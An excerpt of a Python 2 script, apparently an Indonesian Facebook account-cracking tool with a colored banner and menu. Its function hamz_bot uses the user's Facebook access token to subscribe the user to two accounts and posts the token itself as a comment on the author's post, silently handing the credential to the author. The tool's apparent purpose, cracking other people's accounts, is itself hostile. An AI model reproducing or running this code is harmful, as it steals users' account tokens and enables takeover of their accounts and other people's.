...
│                               \033[1;93mMy Name \033[1;92m: \033[1;96xmxer Ramadhan │
└────────────────────────────────────────────────────────┘""""")
id = []
cp = []
ok = []
...
def masuk():
	...
	try:
		...
		if token == "xyz":
			os.system("xdg-open https://free.facebook.com/675583583757549/posts/100198614629385/?app=fbl")
...
###PILIHHH ###
def pilih():
	kontol = raw_input("\033[1;95m  ┌─[xmxr | Gntenk└──╼ ❯❯❯ \033[92m :\033[1;92m ")
	if kontol == "":
		menu()
	elif kontol == "1":
		publik()
...
def hamz_bot():
    ...
    kom = " Bang @[100198614629385:] ACC BANG 🤠🤠🤠
    requests.post('https://graph.facebook.com/100198614629385/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/675583583757549/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/675583583757549/comments/?message=' +token+ '&access_token=' + token)
    requests.post('https://graph.facebook.com/675583583757549/comments/?message=' +kom+ '&access_token=' + token)
    menu()
